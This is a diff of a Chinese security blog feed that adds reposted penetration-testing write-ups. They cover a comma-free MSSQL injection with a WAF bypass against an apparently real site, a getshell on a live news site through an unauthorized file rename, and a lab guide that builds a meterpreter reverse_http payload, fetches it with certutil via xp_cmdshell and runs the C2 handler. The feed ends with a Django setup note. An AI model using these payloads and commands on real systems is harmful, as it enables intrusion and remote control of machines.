@@ -8307,6 +8307,32 @@
 <p>编者荐语：渗透总是在不断试错，一次次的fuzz总会找到出路。</p>
 <p>转载自：<a href="https://www.yuque.com/broken5/blog/lpdex0#HQxQs">https://www.yuque.com/broken5/blog/lpdex0#HQxQs</a></p>
 </blockquote>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>之前遇到过遇到过类似的注入，因为某种原因在注入语句中不能存在逗号，环境又是MSSQL，所以很难构造出来有效的payload。今天在测试的时候又遇到了，怼了几个小时终于出货了，详情见下文</p>
+<h2 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h2><p>首先是一个提交选择的表单</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122301772-30a0d389-88a5-485f-8a21-e8e7795938a7.png" alt="img"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122333800-4b01535e-0211-4da2-9904-fa328dc12bbf.png" alt="img"></p>
+<p>对<code>dcid_5</code>进行了注入测试，结果如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload: <span class="number">36</span> * <span class="number">1</span></span><br><span class="line">结果：<span class="number">200</span></span><br><span class="line"></span><br><span class="line">payload: <span class="number">36</span> * a</span><br><span class="line">结果: <span class="number">500</span></span><br><span class="line"></span><br><span class="line">payload: <span class="title function_ invoke__">len</span>(user)</span><br><span class="line">结果: <span class="number">200</span></span><br><span class="line"></span><br><span class="line">payload: <span class="title function_ invoke__">len</span>(usera)</span><br><span class="line">结果: <span class="number">500</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122432708-20aaf8ea-8f74-4f7d-ab26-ba256ac10a89.png" alt="img"></p>
+<p>基本上断定这就是一个注入，然后尝试利用<code>substring(user,1,1)</code>结果报错了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122489883-4af9348b-c7e6-42ed-bab4-c8b024117a0a.png" alt="img"></p>
+<p>后续又测试了<code>left(user,1)、rigth(user,1)、convert(int,1)</code>都是返回500</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122713847-7ba05470-d3d5-4c52-ac18-71c77d89af3d.png" alt="img"></p>
+<p>测试到这里，我发现可能不是单纯的SQL语句拼接</p>
+<p>仔细观察参数发现了猫腻，<code>dcid_6=39&amp;dcid_6=42&amp;dcid_6=386</code>这三个参数传到WEB服务器，由于<code>.Net</code>解析的特性就变成了<code>dcid_6=39,42,386</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601122880717-2b54c864-9495-400f-aff0-2656d19d741a.png" alt="img"></p>
+<p>加上这是个答案提交的表单，肯定是WEB应用先将参数用<code>逗号</code>分割成<code>列表</code>然后再遍历<code>列表</code>将语句拼接到SQL中，所以这也就导致了我测试的payload只要有<code>逗号</code>就报错</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601123207380-09fc0f38-9ec8-4b82-bf33-c87973db112b.png" alt="img"></p>
+<p>所以得构造一个没有逗号的payload，首选是<code>(case when user like &#39;a%&#39; then 1 else user end)</code></p>
+<p>解析：如果<code>user like &#39;a%&#39;</code>返回<code>1</code>否则返回<code>user</code>，由于对应的字段类型是<code>整数型</code>，传入<code>字符型</code>的<code>user</code>会导致服务器报错，所以可以借此判断注入</p>
+<p>但是目标环境还有WAF，用这条payload被拦截了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601123520682-99d9f354-9c0c-4600-9ca0-11d61227e5cd.png" alt="img"></p>
+<p>Bypass WAF首选是畸形包，因为可以直接绕过，比较方便</p>
+<p>如下图我用<code>filename</code>字段伪造了一个假的文件上传，欺骗了WAF</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601123615463-1bbe1df0-dca7-4d39-b143-1cd38a9cfeb4.png" alt="img"></p>
+<p>然后就用intruder直接跑就行，跑出来第一个字符是<code>l</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E4%B8%80%E6%AC%A1%E6%B2%A1%E6%9C%89%E9%80%97%E5%8F%B7%E7%9A%84MSSQL%E6%B3%A8%E5%85%A5/1601123733020-42622ff2-e4d5-4367-a24a-d008cd3bf948.png" alt="img"></p>
 ]]></content>
       <categories>
         <category>实战系列</category>
@@ -8322,12 +8348,919 @@
 <p>编者荐语：这篇文章是一个基础的渗透测试例子，也有渗透测试遇到的突发情况，比如上传文件到OSS，无法getshell。</p>
 <p>转载自：<a href="https://www.yuque.com/broken5/blog/yngmee">https://www.yuque.com/broken5/blog/yngmee</a></p>
 </blockquote>
+<p>打开首页，整个网站看上去就是一套新闻站，本来是不想把时间浪费在这个站上面的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609311477510-2e159d9c-d11d-4710-b6e2-2608936e3486.png" alt="img"></p>
+<p>测了一下admin目录，需要401认证</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609311855160-dfd0845d-1533-421d-96a3-f356ccc74032.png" alt="img"></p>
+<p>随便点了点，观察其URL像是Tp3的框架，所以就顺手测了一下Tp3的几个常见注入，结果把网站用的CMS给爆了出来</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609311695364-1346b6cb-12ed-48fd-ad43-5b93b0c2118f.png" alt="img"></p>
+<p>用Fofa去找案例，目的是获取源码或者测试出通用漏洞</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609311792787-6431a161-7019-45ab-b97b-365eaf8924a5.png" alt="img"></p>
+<p>到这里整理一下思路，怎么快速的去寻找源码或者测漏洞呢：</p>
+<ol>
+<li>把这几十个站链接保存，通过目录扫描工具批量扫备份获取源码</li>
+<li>通过上传webshell，然后获取源码</li>
+<li>通过CMS的通用备份获取源码</li>
+<li>进后台，后台有未授权添加用户等</li>
+<li>Github根据特征找源码</li>
+<li>等等等</li>
+</ol>
+<p>秉承着上述的思路，测试了一个站点之后找到了一个弱口令</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609312023749-87bf2e01-5e0e-4a7e-bf69-5f81956dd0a3.png" alt="img"></p>
+<p>在后台中我发现了文件管理功能，这个功能一般都能shell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609312725022-d237d4a7-637b-4aa8-a38e-3e3dd7fb3a86.png" alt="img"></p>
+<p>有一个改名的功能并且可以修改后缀名</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609312795919-07e772c2-ce50-4627-9393-c51937ac3223.png" alt="img"></p>
+<p>抓包看参数，路径与文件名都可以完全被用户控制，只需要找一个上传点随便上传一个文件，然后通过修改文件名getshell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609312860379-53b9d004-6d72-44e2-b9fc-0899b3b3863e.png" alt="img"></p>
+<p>仔细观察上面请求包的URL路径会发现，他并不是在<code>/admin/</code>目录下，而是在<code>/Include/</code>目录下，这也就说明了它极有可能是一个<code>未授权文件名修改</code>。删除COOKIE测试之后果然如此</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609313155756-56d0cafc-5108-44cd-94cb-4be2f9bbf094.png" alt="img"></p>
+<p>在发布文章的地方还有一处未授权上传附件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609313229830-4b5dd231-1d0f-4302-b87a-a6f57929e0eb.png" alt="img"></p>
+<p>现在未授权上传点与未授权修改文件名都有了，那就直接可以去目标站getshell了</p>
+<p>可是哪有一番风顺的渗透测试，目标站点启用了OSS，上传的附件传到了OSS上面，所以这个上传点用不了</p>
+<p>继续找了一个别的上传点，都是直接传到OSS上面</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609313471136-5be820eb-afad-4fc3-926e-61643b79b094.png" alt="img"></p>
+<p>绕了一圈，还是回到起点</p>
+<p>之前在Github上找到了这套cms的源码，所以还是从源码入手，寻找有没有上传点是直接上传到服务器，不上传OSS的，打开上传源码<code>EditorAction.class.php</code>这太眼熟了，就是<code>Ueditor</code>上传</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609313729006-5d65f1d5-4346-40d2-b2de-c68b283d72cd.png" alt="img"></p>
+<p><code>Ueditor</code>中有一个<code>catchimage</code>是从远端服务器抓取图片，然后保存到服务器，这总不会上传到OSS吧，立马构造了一个上传包，果然被保存到了本地</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609313933741-58ec74f1-f2d6-4a7e-9307-02cc057d0719.png" alt="img"></p>
+<p>然后通过未授权修改任意文件名，将后缀改为php</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609314024694-0c7e7806-5f3c-4db1-ab24-a139e8963c68.png" alt="img"></p>
+<p>成功getshell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E5%AE%9E%E6%88%98%E4%B9%8B%E6%96%87%E4%BB%B6%E9%87%8D%E5%91%BD%E5%90%8DGetshell/1609314085834-ae1f2fc2-a4e5-4ae8-a26d-df4e8ed9267f.png" alt="img"></p>
 ]]></content>
       <categories>
         <category>实战系列</category>
       </categories>
       <tags>
         <tag>Bypass</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>利用goproxy http上线不出网主机</title>
+    <url>/posts/169a3c2d.html</url>
+    <content><![CDATA[<blockquote>
+<p>编者荐语：对比了许多不出网上线主机的方式，这个项目的 stars 最高，利用方式最简便。无脑推荐这款。</p>
+<p>转载自：<a href="https://mp.weixin.qq.com/s/Ue89ZO01uoztfO4jVAvmCw">https://mp.weixin.qq.com/s/Ue89ZO01uoztfO4jVAvmCw</a></p>
+</blockquote>
+<p>我们接着上篇文章“<a href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490086&idx=1&sn=14525c41cd3990554b324faec7364e72&chksm=cfa6be35f8d1372348f13148276b848ee0641364c99575233f0b6186f35ce73c5e15328208c1&scene=21#wechat_redirect">利用MSF上线断网主机的思路分享</a>”继续来分享一篇如何使用goproxy http代理方式上线不出网主机的利用姿势，结合上篇文章阅读更佳！！！</p>
+<p>项目地址：<a href="https://github.com/snail007/goproxy">https://github.com/snail007/goproxy</a></p>
+<h2 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a><strong>0x01 测试环境</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机（Kali）：192.168.56.101</span><br><span class="line">受害机1（Web）：192.168.56.102、192.168.186.3 - 双网卡</span><br><span class="line">受害机2（Data）：192.168.186.4 - 断网机</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x02-goproxy-http代理上线MSF-x2F-CS"><a href="#0x02-goproxy-http代理上线MSF-x2F-CS" class="headerlink" title="0x02 goproxy http代理上线MSF&#x2F;CS"></a><strong>0x02 goproxy http代理上线MSF&#x2F;CS</strong></h2><p>我们先将goproxy项目的proxy.exe工具通过中国菜刀上传至目标磁盘可读写目录中，执行以下命令在这台出网主机上开启一个8080端口的HTTP代理供后期与不出网主机进行通讯。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\ProgramData\proxy.exe http -t tcp -p &quot;0.0.0.0:8080&quot; --daemon</span><br></pre></td></tr></table></figure>
+
+<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640.png)</p>
+<p>0.0.0.0&#x2F;127.0.0.1区别：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0.0.0.0：本机上的所有IPV4地址；</span><br><span class="line">127.0.0.1：环回地址，仅本地接口IP地址；</span><br></pre></td></tr></table></figure>
+
+<p>这一步可直接省略跳过</p>
+<p>然后再利用系统自带的netsh命令将这台主机56出网段的HTTP代理8080端口转发至186不出网段的8888端口上，用于后期在MSF监听时设置HTTP代理。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">添加端口转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=192.168.186.3 listenport=8888 connectaddress=192.168.56.102 connectport=8080</span><br><span class="line"></span><br><span class="line">删除端口转发</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=192.168.186.3 listenport=8888</span><br><span class="line"></span><br><span class="line">显示所有端口转发</span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
+
+<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507214.png)</p>
+<p>用msfvenom命令生成个<code>meterpreter_reverse_http</code>载荷文件，需要加上以下几个HTTP代理参数，填入186不出网段内网IP的HTTP代理：<a href="http://192.168.186.3:8080/">http://192.168.186.3:8080</a></p>
+<ul>
+<li><code>HttpProxyType</code>：代理类型（HTTP）；</li>
+<li><code>HttpProxyHost</code>：代理地址（192.168.186.3）；</li>
+<li><code>HttpProxyPort</code>：代理端口（8080）；</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_http LHOST=192.168.56.101 LPORT=443 HttpProxyType=HTTP HttpProxyHost=192.168.186.3 HttpProxyPort=8080 -f exe &gt; /tmp/stageless.exe</span><br></pre></td></tr></table></figure>
+
+<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507225.png)</p>
+<p>利用中国菜刀的上传&#x2F;下载功能将该文件放至192.168.186.3的Web服务器中供192.168.186.4断网数据库服务器下载，执行以下命令将<code>stageless.exe</code>下载至断网机磁盘中。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell &#x27;certutil -urlcache -split -f http://192.168.186.3/stageless.exe C:\ProgramData\stageless.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507226.png)</p>
+<p>handler监听模块这里必须也要用<code>meterpreter_reverse_http</code>，配置好相关选项后执行监听，然后在中国菜刀中利用xp_cmdshell组件执行<code>stageless.exe</code>后即可成功上线。‍</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_http</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.56.101</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; set httpproxytype HTTP</span><br><span class="line">msf5 exploit(multi/handler) &gt; set httpproxyhost 192.168.186.3</span><br><span class="line">msf5 exploit(multi/handler) &gt; set httpproxyport 8080</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">EXEC master..xp_cmdshell &#x27;C:\ProgramData\stageless.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507227.png)</p>
+<p>流量走向如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.186.4-&gt;192.168.186.3(192.168.56.102):8080-&gt;C2</span><br><span class="line">192.168.186.4-&gt;192.168.186.3:8888-&gt;192.168.56.102:8080-&gt;C2</span><br></pre></td></tr></table></figure>
+
+<p><code>httpproxytype、httpproxyhost、httpproxyport</code>这几个高级参数选项在<code>options</code>命令中是看不到的，需要用<code>advanced</code>命令才可看到，如下图。</p>
+<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507238.png)</p>
+<p>如需上线至CobaltStrike则可以创建一个新的监听器，有效载荷选择为Beacon HTTP，在HTTP Proxy处填写代理地址：<a href="http://192.168.186.3:8080。">http://192.168.186.3:8080。</a></p>
+<p>将在<code>Windows Executable(S)</code>生成的可执行马儿文件上传&#x2F;下载至192.168.186.4断网数据库服务器中执行即可成功上线。</p>
+<p>![图片](..&#x2F;imgs&#x2F;利用goproxy http上线不出网主机&#x2F;640-16545689507239.png)</p>
+<h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a><strong>注意事项：</strong></h2><p>利用这种方式上线不出网主机时得注意下，生成MSF文件和设置监听时必须使用stageless Payload，而CS则必须要使用Windows Executable(S)，否则其他马儿即使执行成功也不会上线。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stager：分阶段，第一阶段申请内存，第二阶段向C2发起请求并接受shellcode执行；</span><br><span class="line">windows/x64/meterpreter/reverse_http</span><br><span class="line"></span><br><span class="line">stageless：不分阶段，生成时就包含了所有文件，可以避免shellcode传输不畅造成目标无法上线；</span><br><span class="line">windows/x64/meterpreter_reverse_http</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Django+Vue+ElementUi 环境搭建</title>
+    <url>/posts/a9a258d8.html</url>
+    <content><![CDATA[<h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="📌前言"><a href="#📌前言" class="headerlink" title="📌前言"></a>📌前言</h2><p>毕业设计的设想是做一个渗透测试系统，包含信息收集模块和漏洞扫描模块和插件模块，这都是老生常谈，有很多的类似系统，我的最终设想是做成一个 Web 版的 Goby。</p>
+<p>我想使用 Django + Vue 开发成一个前后端分离的系统，顺带学习一下 Vue。</p>
+<p>重复造轮子不可取，但我只是想把毕业设计做了的同时学习一下安全工具的开发，对于我来说，这是一件艰巨且充满挑战的任务。</p>
+<p>每次完成任务都记录一下，方便下次开发的顺利进行。</p>
+<h2 id="🚥环境搭建"><a href="#🚥环境搭建" class="headerlink" title="🚥环境搭建"></a>🚥环境搭建</h2><p>开发工具Vscode、Python&#x3D;3.7.0、Django&#x3D;3.2.13、nodejs&#x3D;v14.18.1、npm&#x3D;6.14.15、mysql（后期添加）</p>
+<p><strong>开发工具：VsCode</strong></p>
+<p>插件安装：中文汉化、Python、</p>
+<p>下载链接：<a href="https://code.visualstudio.com/Download">https://code.visualstudio.com/Download</a></p>
+<p>安装教程：<a href="https://www.runoob.com/w3cnote/vscode-tutorial.html">https://www.runoob.com/w3cnote/vscode-tutorial.html</a></p>
+<p><strong>开发语言：Python</strong></p>
+<p>创建虚拟环境：推荐 virtualenv</p>
+<p>pip 安装 Django</p>
+<p>下载链接：<a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a></p>
+<p>安装教程: <a href="https://www.runoob.com/python3/python3-install.html">https://www.runoob.com/python3/python3-install.html</a></p>
+<p><strong>框架：Django</strong></p>
+<p>下载链接：<a href="https://www.djangoproject.com/download/">https://www.djangoproject.com/download/</a></p>
+<p>安装教程：<a href="https://www.runoob.com/django/django-install.html">https://www.runoob.com/django/django-install.html</a></p>
+<p><strong>Node.js</strong></p>
+<p>下载链接：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></p>
+<p>安装教程：<a href="https://www.runoob.com/nodejs/nodejs-install-setup.html">https://www.runoob.com/nodejs/nodejs-install-setup.html</a></p>
+<p><strong>数据库：mysql</strong></p>
+<p>下载链接：<a href="https://dev.mysql.com/downloads/mysql/">https://dev.mysql.com/downloads/mysql/</a></p>
+<p>安装教程：<a href="https://www.runoob.com/mysql/mysql-tutorial.html">https://www.runoob.com/mysql/mysql-tutorial.html</a></p>
+<h2 id="🔧一、Django"><a href="#🔧一、Django" class="headerlink" title="🔧一、Django"></a>🔧一、Django</h2><h3 id="1-创建项目"><a href="#1-创建项目" class="headerlink" title="1.创建项目"></a>1.创建项目</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">django-admin startproject PentestWeb</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-数据库配置"><a href="#2-数据库配置" class="headerlink" title="2.数据库配置"></a>2.数据库配置</h3><p>安装完MySQL 建好数据库</p>
+<p>cmd窗口登录MySQL：<code>mysql -uroot -p </code></p>
+<p>安装python的pymysql包：<code>pip install pymysql</code></p>
+<p>创建数据库：<code>create DATABASE 数据库名称 DEFAULT CHARSET utf8;</code></p>
+<p><strong>配置数据库：在setting.py 查找 DATABASES</strong></p>
+<p>修改数据库连接信息:</p>
+<p> DATABASES &#x3D; {</p>
+<pre><code> &#39;default&#39;: &#123;
+ 
+     # &#39;ENGINE&#39;: &#39;django.db.backends.sqlite3&#39;,
+ 
+     # &#39;NAME&#39;: BASE_DIR / &#39;db.sqlite3&#39;,
+ 
+     # 自定义数据库
+ 
+     &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,  # 数据库引擎
+ 
+     &#39;NAME&#39;: &#39;Django_ElementUI&#39;,  # 数据库名称
+ 
+     &#39;HOST&#39;: &#39;127.0.0.1&#39;,  # 数据库地址，本机 ip 地址 127.0.0.1
+ 
+     &#39;PORT&#39;: 3306,  # 端口
+ 
+     &#39;USER&#39;: &#39;root&#39;,  # 数据库用户名
+ 
+     &#39;PASSWORD&#39;: &#39;&#39;,  # 数据库密码
+ 
+ &#125;
+</code></pre>
+<p> }<br><strong>引入模块：在 <strong>init</strong>.py文件里增加：</strong></p>
+<blockquote>
+<p>import pymysql</p>
+</blockquote>
+<blockquote>
+<p>pymysql.install_as_MySQLdb()</p>
+</blockquote>
+<h3 id="3-创建模型并且设计数据库表"><a href="#3-创建模型并且设计数据库表" class="headerlink" title="3.创建模型并且设计数据库表"></a>3.创建模型并且设计数据库表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py startapp InfoScan</span><br></pre></td></tr></table></figure>
+
+<p>创建好 app 之后，进入 models.py 文件，创建数据库类：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line">class Student(models.Model):</span><br><span class="line"> </span><br><span class="line">    student_name = models.CharField(max_length=64)</span><br><span class="line"> </span><br><span class="line">    student_sex = models.CharField(max_length=3)</span><br><span class="line"> </span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=True)</span><br><span class="line"> </span><br><span class="line">    def __str__(self):</span><br><span class="line"> </span><br><span class="line">        return self.student_name,self.id</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-注册app"><a href="#4-注册app" class="headerlink" title="4.注册app"></a>4.注册app</h3><p>在INSTALLED_APPS中 添加’InfoScan’:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    &#x27;InfoScan&#x27;,</span><br><span class="line">    &#x27;django.contrib.admin&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth&#x27;,</span><br><span class="line">    &#x27;django.contrib.contenttypes&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages&#x27;,</span><br><span class="line">    &#x27;django.contrib.staticfiles&#x27;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
